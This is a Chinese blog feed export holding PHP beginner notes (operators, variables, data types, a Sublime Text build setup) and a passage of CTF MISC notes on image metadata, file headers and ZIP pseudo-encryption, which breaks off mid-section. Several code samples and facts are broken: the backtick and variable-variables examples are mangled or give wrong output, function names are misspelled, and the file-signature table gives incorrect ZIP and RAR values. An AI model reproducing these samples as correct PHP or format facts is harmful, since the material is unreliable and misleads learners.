color=#ff0000 size=3>^</font>    按位异或<br>只有参与运算的两位不同，运算结果才为1，否则为0</p></li><li><p><font color=#ff0000 size=3>~</font>    按位非<br> 将二进制表示的操作数中的1变成0，0变成1</p></li><li><p><font color=#ff0000 size=3>&lt;&lt;</font>    左移<br> 将左边的操作数在内存中的二进制数据左移右边操作数指定的位数，右边移空的部分补上0</p></li><li><p><font color=#ff0000 size=3>&gt;&gt;</font>右移<br>将左边的操作数在内存中的二进制数据右移右边操作数指定的位数，左边移空的部分补上0</p></li></ol><h2 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h2><table><thead><tr><th>运算符</th><th>解释</th></tr></thead><tbody><tr><td>？：</td><td>三元运算符，可以提供简单的逻辑判断</td></tr><tr><td>``</td><td>反引号 是执行运算符，php将尝试将反引号中的内容作为外壳命令来执行，并将其输</td></tr><tr><td>@</td><td>错误控制运算符，当将其放置在一个php表达式之前，该表达式可能产生的任何错误信息都将被忽略掉</td></tr><tr><td>=&gt;</td><td>数组下标指定符号，通过此符号指定数组的键与值</td></tr><tr><td>-&gt;</td><td>对象成员访问符号，访问对象中的成员属性或成员方法</td></tr><tr><td>instanceof</td><td>类型运算符，用来测定一个给定的对象是否来自指定的对象类</td></tr></tbody></table><ol><li>？：<br> 三元运算<br>格式:   表达式1 ?表达式2 :表达式3;<br>如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-literal">false</span> ? <span class="hljs-number">10</span> : <span class="hljs-number">20</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><ol start="2"><li>``<br>反引号 是执行运算符，php将尝试将反引号中的内容作为外壳命令来执行，并将其输入信息返回</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>= <span class="hljs-string">&quot; ipconfig&#x27;;</span><br><span class="hljs-string"><span class="hljs-subst">$b</span>=&#x27; ifconfig&#x27; ;</span><br><span class="hljs-string">var_dump(<span class="hljs-subst">$b</span>) ;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot; ifconfig&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><p>@<br>错误控制运算符，屏蔽表达式可能发生错误!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> @<span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure></li><li><p>=&gt;<br>数组下标指定符号，通过此符号指定数组的键与值。=&gt;符号来分隔键和值，左侧表示键，右侧表示值。</p></li><li><p>-&gt;<br>对象成员访问符号，访问对象中的成员属性或成员方法。-&gt;是对象执行方法或取得属性用的。</p></li><li><p>instanceof<br>类型运算符，用来测定一个给定的对象是否来自指定的对象类</p></li></ol><h2 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h2><p>优先级归纳:.</p><ol><li>[无]递增递减</li><li> [右]逻辑非!</li><li>[左]乘，除，取余</li><li>[左]加，减，字符串连接符</li><li>[无]包含大于号或者小于号的比较运算符</li><li> [无]不包含大于号或者小于号的比较运算符</li><li>[左]逻辑与&amp;&amp;</li><li>[左]逻辑或||</li><li>[左]? :</li><li>[右]赋值运算符</li><li>[在] 逻辑异或xor</li></ol><blockquote><p>圆括号的作用:<br>用圆括号可以将表达式里面的某一块看成一个整体!使用括号可以增强代码的可读性。</p></blockquote><p>  <strong>注意</strong><br>PHP中规定:<br>使用echo输出布尔类型值的时候<br>echo true;它在页面中会输出1<br>echo false;它会在页面中什么都不输出<br>所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了</p>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP的基本概念和变量</title>
    <link href="/2020/05/20/PHP%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E9%87%8F/"/>
    <url>/2020/05/20/PHP%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP学习笔记（一）</p> <a id="more"></a><h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><blockquote><p> PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</p><p> PHP 脚本在服务器上执行。</p><p> PHP 可免费下载使用。</p></blockquote><p>PHP是创建动态网页的最流行的服务器端脚本语言，并且是开源免费的。</p><blockquote><p>PHP代表超文本预处理器。PHP是一种非常流行且广泛使用的开源服务器端脚本语言，用于编写动态生成的Web页面。PHP最初由 Rasmus Lerdorf 于1994年创建。它最初被称为个人主页。<br>PHP脚本在服务器上执行，结果以纯HTML格式发送到Web浏览器。PHP可以与众多流行数据库集成，包括MySQL，PostgreSQL，Oracle，Microsoft SQL Server，Sybase等。</p></blockquote><p><strong>运行</strong></p><p>下面我们来运行第一个程序！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello World!&quot;</span>; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Hello World!<br></code></pre></td></tr></table></figure><h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><p>PHP变量是什么？</p><p>1、在PHP中变量是用于储存信息的容器，类似于数学中的集合。<br>2、赋值方法与数学中的代数相类似。<br>3、变量是用于存储信息的”容器”。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$x</span>=<span class="hljs-number">5</span>;<br><span class="hljs-variable">$y</span>=<span class="hljs-number">6</span>;<br><span class="hljs-variable">$z</span>=<span class="hljs-variable">$x</span>+<span class="hljs-variable">$y</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$z</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><p>PHP 变量与代数类似，可以给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。</p><p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 name、age、id）。</p><h2 id="PHP变量的创建（声明）"><a href="#PHP变量的创建（声明）" class="headerlink" title="PHP变量的创建（声明）"></a>PHP变量的创建（声明）</h2><blockquote><p>$变量名=数据(值)<br>=在数学里面是等于的意思,在我们的程序语言里面，它不是等于号，它是’赋值操作符’</p></blockquote><p>PHP 没有声明变量的命令。</p><p>变量在第一次赋值给它的时候被创建：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Hello world!&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-number">5</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-number">10.5</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在上面的语句执行中，<br>变量 a将保存值 Hello world!，且变量b将保存值 5,同理变量c保存值10.5。</p><p><strong>注意：当您赋一个<font color=#FF0000 size=3>文本值</font>给变量时，请在文本值两侧加上引号。</strong></p><h2 id="PHP变量的销毁"><a href="#PHP变量的销毁" class="headerlink" title="PHP变量的销毁"></a>PHP变量的销毁</h2><blockquote><p>运用unset()函数消除变量<br>格式： unset($变量名称)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>; .<br><span class="hljs-keyword">unset</span> (<span class="hljs-variable">$a</span>) :<span class="hljs-comment">//销毁a变量</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-comment">//提示出错，因为变量a已经被销毁了</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-变量的命名规则"><a href="#PHP-变量的命名规则" class="headerlink" title="PHP 变量的命名规则"></a>PHP 变量的命名规则</h2><blockquote><p>PHP 变量规则：</p><p>变量以 $ 符号开始，后面跟着变量的名称</p><p>变量名必须以字母或者下划线字符开始</p><p>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</p><p>变量名不能包含空格</p><p>变量名是严格区分大小写的（$name和$NAME是两个不同的变量）</p></blockquote><p>注：PHP中有一些标示符是系统定义的，也称为关键字，是PHP语言的组成部分，因此不能使用它们中的任何一个作为常量函数名或类名。但是和其他语言不同的是可以在PHP中作为变量名称使用不过这样容易混淆，所以最好还是不要用PP的关键字作为变量名称。</p><p><img src="https://img-blog.csdnimg.cn/20200520193400288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="PHP可变变量"><a href="#PHP可变变量" class="headerlink" title="PHP可变变量"></a>PHP可变变量</h2><p>一个变量的名字可以动态的设置和使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$abc</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<span class="hljs-comment">//定义了一个变量abc里面存了值test</span><br><span class="hljs-variable">$abc</span>=<span class="hljs-string">&#x27;aaa&#x27;</span> ;<span class="hljs-comment">//$test=&#x27;aaa&#x27;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">aaa<br></code></pre></td></tr></table></figure><h2 id="PHP变量的引用赋值"><a href="#PHP变量的引用赋值" class="headerlink" title="PHP变量的引用赋值"></a>PHP变量的引用赋值</h2><p>引用赋值可以简单的理解为给变量起了个别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1000</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>;<span class="hljs-comment">//相当于把$a的值，复制一份再赋值给$b这个变量</span><br><span class="hljs-variable">$b</span>=&amp;<span class="hljs-variable">$a</span>;<span class="hljs-comment">//相当于给$a起了一个别名，操作其中任何一个，都会影响到另外一个变量的值!</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h2 id="PHP变量类型"><a href="#PHP变量类型" class="headerlink" title="PHP变量类型"></a>PHP变量类型</h2><blockquote><p>使用var_ dump(变量名)可以输出变量的类型</p></blockquote><p>1.变量类型简介</p><blockquote><p>在PHP程序中，数据类型可以分成3种：标量数据类型、复合数据类型（即将多个简单数据类型组合在一起，存储在一个变量名中）和特殊数据类型。<br>1．标量数据类型标量数据类型包括以下几种。<br>（1）boolean：布尔型<br>布尔变量是PHP变量中最简单的。它保存一个True或者False值。其中True或者False是PHP的内部关键字。设定一个布尔型的变量，只需将True或者False赋值给该变量<br>（2）string：字符串<br>字符串是连续的字符序列，字符串中的每个字符只占用一个字节。在PHP中，定义字符串有3种方式：单引号方式，双引号方式，定界符方式。<br>（3）integer：整数<br>整数数据类型只能包含整数。这些数据类型可以是正数或负数。在32位的操作系统中，有效的范围是2 147 483 648～+2147 483<br>647。<br>（4）double：浮点数<br>浮点数据类型可以用来存储数字，也可以保存小数。它提供的精度不整数大得多。在32位的操作系统中，有效的范围是1.7E-308～1.7E+308。</p><p>2．复合数据类型复合数据类型包括以下两种。<br>（1）array：数组可以是二维、三维或者多维，数组中的各元素可以是string、integer或double，也可以是array。<br>（2）object：对象类型</p><p>3．特殊数据类型特殊数据类型包括以下两种。<br>（1）resource：资源 资源是PHP内的几个函数所需要的特殊数据类型，由编程人员来分配。<br>（2）null：空值 空值是最简单的数据类型。表示没有为该变量设置任何值，另外，空值（NULL）不区分大小写。</p></blockquote><ol><li>bool(布尔型)</li></ol><p>  这个是最简单的类型布尔型表达了true或false,即真或假。 以下值被认为是false.其他的值都是被认为是true<br>   ①布尔值false<br> ②0<br>  ③浮点型0.0<br>④空白字符事和字符串<br>   ⑤没有成员的数组<br>   ⑥NULL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>= <span class="hljs-literal">true</span>,<br>var_ dump(<span class="hljs-variable">$a</span>) ;<span class="hljs-comment">//往变量里面存true或者talse,那么这个变量就是布尔型了</span><br></code></pre></td></tr></table></figure><ol start="2"><li>int (整型)<br>往变量里面存储整数，那么这个变量就是整型变量了</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br>var_ _dusp(<span class="hljs-variable">$a</span>)<br></code></pre></td></tr></table></figure><ol start="3"><li>float (浮点型，也称double)<br>往变量里面存小数，那么这个变量就是浮点型变量了</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-number">1.1</span>;<br>var_ _dusp(<span class="hljs-variable">$a</span>)<br></code></pre></td></tr></table></figure><ol start="4"><li>string (字符串)<br>字符串就是一系列的字符组成串在一起，字符串可以使用单引号、双引号、定界符三种方法来定义!</li></ol><p>①单引号</p><blockquote><p>指定一个简单的字符串最简单的方法是使用一对单引号括起来注意在单引号’括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要用反斜杠()转义，问题，如果宇符串中确实需要一个真正的反斜杠怎么办?<br>单引号字符串中出现的安量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义简单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串!</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test$abc\&#x27;defgh&#x27;</span>;<br>var_ dump(<span class="hljs-variable">$a</span>) ;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;test<span class="hljs-subst">$abc</span>&#x27;defgh&quot;</span><br>test<span class="hljs-variable">$abc</span><span class="hljs-string">&#x27;defgh</span><br></code></pre></td></tr></table></figure><p>在定义一些简单的字符串的时候使用单引号这种方法效率比较高</p><p>②双引号<br>双引号括起来，其中的变量名会被变量值所代替。即PHP会解析双引号之间的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-number">100</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27; teSbst......&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;te<span class="hljs-subst">&#123;$b&#125;</span>t......&quot;</span>;<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;te100t......&quot;</span><br>te100t......<br></code></pre></td></tr></table></figure><p> ③定界符<br> &lt;&lt;&lt;之后提供一个标示符开始，然后是字符串的内容最后是同样的</p><blockquote><p>标示符表示结束<br>注意结束标示符之后必须接，不可以用其他的任何字符<br>标示符的命名规则：字母数字下划线。 并且不能以数字开始</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=&lt;&lt;&lt;aaa<br>abcdefghijklmnopqrstuvwxyz<br>aaa ;<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">26</span>) <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-是一门弱类型语言"><a href="#PHP-是一门弱类型语言" class="headerlink" title="PHP 是一门弱类型语言"></a>PHP 是一门弱类型语言</h2><ol><li><p>不必向 PHP 声明该变量的数据类型。</p></li><li><p>PHP 会根据变量的值，自动把变量转换为正确的数据类型。</p></li><li><p>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。</p></li></ol><h2 id="phpstudy2020-Sublime-Text-3创建PHP编译环境"><a href="#phpstudy2020-Sublime-Text-3创建PHP编译环境" class="headerlink" title="phpstudy2020+Sublime Text 3创建PHP编译环境"></a>phpstudy2020+Sublime Text 3创建PHP编译环境</h2><p>在phpstudy文件目录下，找到这个文件夹，复制路径</p><p><img src="https://img-blog.csdnimg.cn/20201014210142241.png#pic_center" alt="在这里插入图片描述"><br>右击此电脑，点击属性-&gt;高级系统设置-&gt;环境变量</p><p>在系统变量里面找到Path，点击编辑，填入上面文件夹的路径，然后点击确定</p><p><img src="https://img-blog.csdnimg.cn/20201014210356900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>检测上面配置是否成功，重新打开一个cmd命令窗体，输入命令<code>php -h</code>查看是否会提示php的命令使用方法，有提示则表示上面步骤已成功<br><img src="https://img-blog.csdnimg.cn/20201014212428202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>打开Sublime Text 3，点击tools，Build System，New Build System<br><img src="https://img-blog.csdnimg.cn/2020101421103991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201014211112480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>默认的内容是：<code>&#123; &quot;shell_cmd&quot;: &quot;make&quot;&#125;</code>修改为：<code>&#123; &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], &quot;file_regex&quot;: &quot;php$&quot;, &quot;selector&quot;: &quot;source.php&quot; &#125;</code><br><img src="https://img-blog.csdnimg.cn/20201014211625688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>保存在默认的目录下即可，注意修改文件名为 <code>php.sublime-build</code> 。<br><img src="https://img-blog.csdnimg.cn/20201014211554919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>重启sublime text3，在运行php时一定记得要切换，就可以用Ctrl+B来编译.php文件了；。<br><img src="https://img-blog.csdnimg.cn/2020101421480068.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISC总结</title>
    <link href="/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/"/>
    <url>/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>摘要：记录做题遇见的不同分类的杂项题，持续更新…</p> <a id="more"></a><blockquote><p>记录做题遇见的不同分类的杂项题，持续更新…</p></blockquote><h2 id="1-看图片属性"><a href="#1-看图片属性" class="headerlink" title="1.看图片属性"></a>1.看图片属性</h2><p>根据提示，找到图片属性,flag就出来了<br><img src="https://img-blog.csdnimg.cn/20200404130443932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"></p><h2 id="2-隐藏在字节中"><a href="#2-隐藏在字节中" class="headerlink" title="2.隐藏在字节中"></a>2.隐藏在字节中</h2><p>把图片放入010editor中，在文本中搜索<code>SL&#123;</code></p><p><img src="https://img-blog.csdnimg.cn/20200404130740295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"></p><h2 id="3-补充头部"><a href="#3-补充头部" class="headerlink" title="3.补充头部"></a>3.补充头部</h2><table><thead><tr><th></th><th>常见文件文件头文件尾格式</th><th></th></tr></thead><tbody><tr><td>文件名</td><td>文件头</td><td>文件尾</td></tr><tr><td>JPEG (jpg)</td><td>FFD8FF</td><td>FF D9</td></tr><tr><td>PNG (png)</td><td>89504E47</td><td>AE 42 60 82</td></tr><tr><td>GIF (gif)</td><td>47494638</td><td>00 3B</td></tr><tr><td>ZIP Archive (zip)</td><td>504B0304</td><td>FF D9</td></tr><tr><td>RAR Archive (rar)</td><td>50 4B</td><td></td></tr></tbody></table><p> 将该图片以十六进制格式打开，发现该png图片缺失文件头，补充png文件头89504E47<br><img src="https://img-blog.csdnimg.cn/20200404133820680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"></p><h2 id="4-ZIP"><a href="#4-ZIP" class="headerlink" title="4. ZIP"></a>4. ZIP</h2><h3 id="ZIP文件格式"><a href="#ZIP文件格式" class="headerlink" title="ZIP文件格式"></a>ZIP文件格式</h3><p>一个 ZIP 文件由三个部分组成：</p><blockquote><p>压缩源文件数据区+压缩源文件数据区+压缩源文件目录结束标志</p></blockquote><p><strong>压缩源文件数据区</strong>： </p><blockquote><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>20 9E：最后修改文件时间<br>66 4F：最后修改文件日期<br>F2 1B 0F 4A：CRC-32校验（4A0F1BF2）<br>0E 00 00 00：压缩后尺寸<br>0C 00 00 00：未压缩尺寸<br>08 00：文件名长度<br>00 00：扩展记录长度<br>66 6C 61 67 2E 74 78 74: 文件名（不定长）<br>4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据</p><p> <strong>压缩源文件数据区</strong>：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式  20 9E：最后修改文件时间  66 4F：最后修改文件日期<br>F2 1B 0F 4A：CRC-32校验（4A0F1BF2）<br>0E 00 00 00：压缩后尺寸<br>0C 00 00 00：未压缩尺寸<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></blockquote><p><strong>压缩源文件目录结束标志：</strong> </p><blockquote><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>34 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210112155557144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>区分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">无加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00<br><br>伪加密         <br>压缩源文件数据区的全局加密应当为00 00 <br>且压缩源文件目录区的全局方式位标记应当为09 00<br><br>真加密         <br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br></code></pre></td></tr></table></figure><h3 id="真加密"><a href="#真加密" class="headerlink" 